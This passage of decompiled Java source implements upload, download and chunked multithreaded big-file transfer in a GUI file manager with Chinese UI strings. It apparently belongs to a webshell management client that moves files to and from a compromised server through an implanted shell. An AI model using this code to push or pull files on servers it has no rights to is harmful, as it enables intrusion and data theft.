        }
        String src = fileOpertionInfo.getSrcFileName() == null ? "" : fileOpertionInfo.getSrcFileName().trim();
        String dest = fileOpertionInfo.getDestFileName() == null ? "" : fileOpertionInfo.getDestFileName().trim();
        if (src.isEmpty() || dest.isEmpty()) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0a\u4f20\u8def\u5f84\u4e3a\u7a7a", "\u63d0\u793a", 2);
            return;
        }
        File local = new File(src);
        if ((dest.endsWith("/") || dest.endsWith("\\")) && local.getName().length() > 0) {
            dest = dest + local.getName();
        }
        this.uploadFile(dest, local, bigFileUpload);
    }

    private void UploadFile(boolean bigFileUpload) {
        GFileChooser chooser = new GFileChooser();
        File selectdFile = chooser.showOpenDialog(this);
        if (selectdFile != null) {
            String uploadFileString = this.currentDir + selectdFile.getName();
            this.uploadFile(uploadFileString, selectdFile, bigFileUpload);
        }

    }

    public void uploadFile(String uploadFileString, File selectdFile, boolean bigFileUpload) {
        byte[] data = new byte[0];
        Log.log(String.format("%s starting %s -> %s\t threadId: %s", "upload", selectdFile, uploadFileString, Thread.currentThread().getId()));
        boolean state = false;
        if (!bigFileUpload && selectdFile.length() <= (long)this.shellEntity.getOnceBigFileUploadByteNum()) {
            try {
                FileInputStream fileInputStream = new FileInputStream(selectdFile);
                data = functions.readInputStream(fileInputStream);
                fileInputStream.close();
            } catch (FileNotFoundException var7) {
                Log.error(var7);
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u6587\u4ef6\u4e0d\u5b58\u5728", "\u63d0\u793a", 2);
            } catch (IOException var8) {
                Log.error(var8);
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), var8.getMessage(), "\u63d0\u793a", 2);
            }

            state = this.payload.uploadFile(uploadFileString, data);
        } else {
            state = this.uploadBigFile(uploadFileString, selectdFile);
        }

        if (state) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0a\u4f20\u6210\u529f", "\u63d0\u793a", 1);
            this.refreshFile(this.currentDir);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0a\u4f20\u5931\u8d25", "\u63d0\u793a", 2);
        }

        Log.log(String.format("%s finish \t threadId: %s", "upload", Thread.currentThread().getId()));
    }

    private void GDownloadFile(boolean bigFileDownload) {
        String file = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog2.showFileOpertion(this.shellEntity.getFrame(), "download", file, "");
        if (fileOpertionInfo.getOpertionStatus() == null || !fileOpertionInfo.getOpertionStatus().booleanValue()) {
            return;
        }
        String src = fileOpertionInfo.getSrcFileName() == null ? "" : fileOpertionInfo.getSrcFileName().trim();
        String dest = fileOpertionInfo.getDestFileName() == null ? "" : fileOpertionInfo.getDestFileName().trim();
        if (src.isEmpty() || dest.isEmpty()) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u8def\u5f84\u4e3a\u7a7a", "\u63d0\u793a", 2);
            return;
        }
        this.downloadFile(src, new File(dest), bigFileDownload);

    }

    private void downloadFile(boolean bigFileDownload) {
        GFileChooser chooser = new GFileChooser();
        chooser.setSelectedFile(this.getSelectdFileName());
        File selectdFile = chooser.showSaveDialog(this);
        String srcFile = this.getSelectdFile();
        if (srcFile != null && srcFile.trim().length() > 0) {
            if (selectdFile != null) {
                FileInfo fileInfo = (FileInfo)this.dataView.getValueAt(this.dataView.getSelectedRow(), 4);
                if (fileInfo.getSize() > (long)this.shellEntity.getOnceBigFileDownloadByteNum()) {
                    bigFileDownload = true;
                }

                this.downloadFile(srcFile, selectdFile, bigFileDownload);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u672a\u9009\u4e2d\u4e0b\u8f7d\u6587\u4ef6", "\u63d0\u793a", 2);
        }

    }

    private void downloadFile(String srcFileString, File destFile, boolean bigFileDownload) {
        byte[] data = new byte[0];
        Log.log(String.format("%s starting %s -> %s\t threadId: %s", "download", srcFileString, destFile, Thread.currentThread().getId()));
        boolean state = false;
        if (bigFileDownload) {
            state = this.downloadBigFile(srcFileString, destFile);
        } else {
            data = this.payload.downloadFile(srcFileString);
            state = functions.filePutContent(destFile, data);
        }

        if (state) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u6210\u529f", "\u63d0\u793a", 1);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u5931\u8d25", "\u63d0\u793a", 2);
        }

        Log.log(String.format("%s finish \t threadId: %s", "download", Thread.currentThread().getId()));
    }

    private boolean downloadBigFile(String srcFileString, File destFile) {
        int bigFileErrorRetryNum = this.shellEntity.getBigFileErrorRetryNum();
        int onceBigFileDownloadByteNum = this.shellEntity.getOnceBigFileDownloadByteNum();
        ApplicationContext.isShowHttpProgressBar.set(false);

        try {
            long fileSize = this.payload.getFileSize(srcFileString);
            if (fileSize != -1L) {
                AtomicBoolean isError = new AtomicBoolean(false);
                AtomicReference<String> errorMessage = new AtomicReference("empty");
                AtomicBoolean isDone = new AtomicBoolean(false);
                FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                FileChannel fileChannel = fileOutputStream.getChannel();
                TaskProcessor taskProcessor = new TaskProcessor(fileSize, (long)onceBigFileDownloadByteNum);
                HttpProgressBar httpProgressBar = new HttpProgressBar(String.format((String)Objects.requireNonNull(EasyI18N.getI18nString("\u5927\u6587\u4ef6\u4e0b\u8f7d\u5f00\u59cb \u6587\u4ef6\u540d:%s")), srcFileString), fileSize, false);
                ArrayList<Thread> threads = new ArrayList();
                int threadNum = this.shellEntity.getBigFileDownloadThreadNum();
                if (threadNum <= 0) {
                    threadNum = 1;
                }

                for(int i = 0; i < threadNum; ++i) {
                    Thread thread = new Thread(() -> {
                        int errorNum = 0;
                        long currentOffset = 0L;

                        while(true) {
                            while(true) {
                                try {
                                    if (errorNum == 0) {
                                        currentOffset = taskProcessor.takeChunkPosition();
                                    }

                                    if (currentOffset == -1L || isError.get()) {
                                        return;
                                    }

                                    if (errorNum < bigFileErrorRetryNum) {
                                        synchronized(isError) {
                                            if (!isError.get()) {
                                                label168: {
                                                    synchronized(isDone) {
                                                        if (!httpProgressBar.isClose() || isDone.get()) {
                                                            break label168;
                                                        }

                                                        isError.set(true);
                                                        errorMessage.set("\u5df2\u5f3a\u5236\u5173\u95ed");
                                                    }

                                                    return;
                                                }
                                            }
                                        }

                                        byte[] result = this.payload.bigFileDownload(srcFileString, currentOffset, onceBigFileDownloadByteNum);
                                        synchronized(fileChannel) {
                                            if (result.length == onceBigFileDownloadByteNum || (long)result.length + currentOffset >= fileSize) {
                                                errorNum = 0;
                                                boolean isRet = false;
                                                synchronized(isDone) {
                                                    if ((long)result.length + currentOffset >= fileSize) {
                                                        isDone.set(true);
                                                        isRet = true;
                                                    }
                                                }

                                                fileChannel.position(currentOffset);
                                                fileChannel.write(ByteBuffer.wrap(result));
                                                httpProgressBar.setValue(currentOffset);
                                                if (isRet) {
                                                    return;
                                                }
                                            } else {
                                                synchronized(isError) {
                                                    if (isError.get()) {
                                                        continue;
                                                    }

                                                    isError.set(true);
                                                    fileOutputStream.write(result);
                                                    Log.error(this.encoding.Decoding(result));
                                                    errorMessage.set(this.encoding.Decoding(result));
                                                    httpProgressBar.close();
                                                }

                                                return;
                                            }
                                        }
                                    } else {
                                        synchronized(isError) {
                                            if (!isError.get()) {
                                                isError.set(true);
                                                errorMessage.set("\u9519\u8bef\u6b21\u6570\u8d85\u9650");
                                                httpProgressBar.close();
                                            }
                                        }
                                    }
                                } catch (Exception var31) {
                                    ++errorNum;
                                    Log.error(var31);

                                    try {
                                        Thread.sleep(1000L);
                                    } catch (InterruptedException var24) {
                                    }
                                }
                            }
                        }
                    });
                    threads.add(thread);
                    thread.setName("Thread BigFileDownload - " + i);
                    thread.start();
                    threads.add(thread);
                }

                Iterator<Thread> threadIterator = threads.stream().iterator();

                while(threadIterator.hasNext()) {
                    ((Thread)threadIterator.next()).join();
                }

                fileChannel.close();
                fileOutputStream.flush();
                fileOutputStream.close();
                httpProgressBar.close();
                Log.log("\u5927\u6587\u4ef6\u4e0b\u8f7d\u7ed3\u675f src:%s dest:%s \u6587\u4ef6\u5927\u5c0f:%d \u4e0b\u8f7d\u5927\u5c0f:%d", new Object[]{srcFileString, destFile.getAbsolutePath(), fileSize, fileSize - taskProcessor.remaining()});
                if (isError.get()) {
                    GOptionPane.showMessageDialog(this.shellEntity.getFrame(), errorMessage.get(), "\u9519\u8bef\u63d0\u793a", 0);
                    return false;
                }

                return true;
            }

            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "\u5927\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25 \u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u8005\u65e0\u6cd5\u8bbf\u95ee", "\u63d0\u793a", 0);
            Log.error("\u5927\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25 \u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u8005\u65e0\u6cd5\u8bbf\u95ee");
        } catch (Exception var18) {
            Log.error(var18);
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), var18.getMessage(), "\u9519\u8bef\u63d0\u793a", 0);
        }

        return false;
    }

    public boolean uploadBigFile(String uploadFileString, File selectdFile) {
        try {
            return this.uploadBigFile(uploadFileString, selectdFile.getAbsolutePath(), new FileInputStream(selectdFile));
        } catch (FileNotFoundException var4) {
            throw new RuntimeException(var4);
        }
    }

    public boolean uploadBigFile(String uploadFileString, String localFilename, InputStream localInputStream) {
        int bigFileErrorRetryNum = this.shellEntity.getBigFileErrorRetryNum();
        int onceBigFileUploadByteNum = this.shellEntity.getOnceBigFileUploadByteNum();
        ApplicationContext.isShowHttpProgressBar.set(false);

        try {
            ByteArrayInputStream fileInputStream = new ByteArrayInputStream(functions.readInputStreamAutoClose(localInputStream));
            long fileSize = (long)fileInputStream.available();
            byte[] readData = new byte[onceBigFileUploadByteNum];
            byte[] result = new byte[0];
            int currentOffset = 0;

            HttpProgressBar httpProgressBar = new HttpProgressBar(String.format(EasyI18N.getI18nString("\u5927\u6587\u4ef6\u4e0a\u4f20\u5f00\u59cb \u6587\u4ef6\u540d:%s"), localFilename), fileSize, true);
            int errorNum = 0;
            Log.log(String.format("\u5927\u6587\u4ef6\u4e0a\u4f20\u5f00\u59cb src:%s dest:%s \u6587\u4ef6\u5927\u5c0f:%d \u4e0a\u4f20\u5927\u5c0f:%d", localFilename, uploadFileString, fileSize, currentOffset));

            int readLen;
            while((readLen = fileInputStream.read(readData)) != -1) {
                result = Arrays.copyOfRange(readData, 0, readLen);

                while(true) {
                    try {
                        if (errorNum >= bigFileErrorRetryNum) {
                            Log.log(String.format("\u5927\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f \u6587\u4ef6\u5927\u5c0f:%d \u4e0a\u4f20\u5927\u5c0f:%d", fileSize, currentOffset));
                            httpProgressBar.close();
                            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "\u9519\u8bef\u6b21\u6570\u8d85\u9650", "\u63d0\u793a", 0);
                            fileInputStream.close();
                            return false;
                        }

                        if (httpProgressBar.isClose()) {
                            Log.log(String.format("\u5927\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f \u6587\u4ef6\u5927\u5c0f:%d \u4e0a\u4f20\u5927\u5c0f:%d", fileSize, currentOffset));
                            fileInputStream.close();
                            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "\u5df2\u5f3a\u5236\u5173\u95ed", "\u63d0\u793a", 0);
                            httpProgressBar.close();
                            return false;
                        }

                        String flag = this.payload.bigFileUpload(uploadFileString, (long)currentOffset, result);
                        if (!"ok".equals(flag)) {
                            Log.log(String.format("\u5927\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f \u6587\u4ef6\u5927\u5c0f:%d \u4e0a\u4f20\u5927\u5c0f:%d", fileSize, currentOffset));
                            httpProgressBar.close();
                            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), flag, "\u63d0\u793a", 0);
                            fileInputStream.close();
                            return false;
                        }

                        errorNum = 0;
                        currentOffset += readLen;
                        httpProgressBar.setValue((long)currentOffset);
                        break;
                    } catch (Exception var16) {
                        ++errorNum;
                        Log.error(var16);
                        Thread.sleep(500L);
                    }
                }
            }

            fileInputStream.close();
            Log.log("\u5927\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f src:%s dest:%s \u6587\u4ef6\u5927\u5c0f:%d \u4e0a\u4f20\u5927\u5c0f:%d", new Object[]{localFilename, uploadFileString, fileSize, currentOffset});
            httpProgressBar.close();
            return true;
        } catch (Exception var17) {
            Log.error(var17);
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), var17.getMessage(), "\u9519\u8bef\u63d0\u793a", 0);
            return false;
        }
    }

    static class TaskProcessor {
        long maxSize;
        long chunkSize;
        long currentChunk;

        public TaskProcessor(long maxSize, long chunkSize, long currentChunk) {
            this.maxSize = maxSize;
            this.chunkSize = chunkSize;
            this.currentChunk = currentChunk;
        }

        public TaskProcessor(long maxSize, long chunkSize) {
            this(maxSize, chunkSize, 0L);
        }

        public long takeChunkPosition() {
            synchronized(this) {
                if (this.remaining() == 0L) {
                    return -1L;
                } else {
                    long ret = this.currentChunk * this.chunkSize;
                    if (ret > this.maxSize) {
                        ret = this.maxSize - (this.currentChunk - 1L) * this.chunkSize;
                    }

                    ++this.currentChunk;
                    return ret;
                }
            }
        }

        public synchronized long remaining() {
            long currentPos = this.chunkSize * this.currentChunk;
            long ret = 0L;
            if (currentPos > this.maxSize) {
                ret = currentPos - this.currentChunk;
                return ret > this.maxSize ? 0L : this.maxSize - currentPos;
            } else {
                return this.maxSize - currentPos;
            }
        }
    }
}
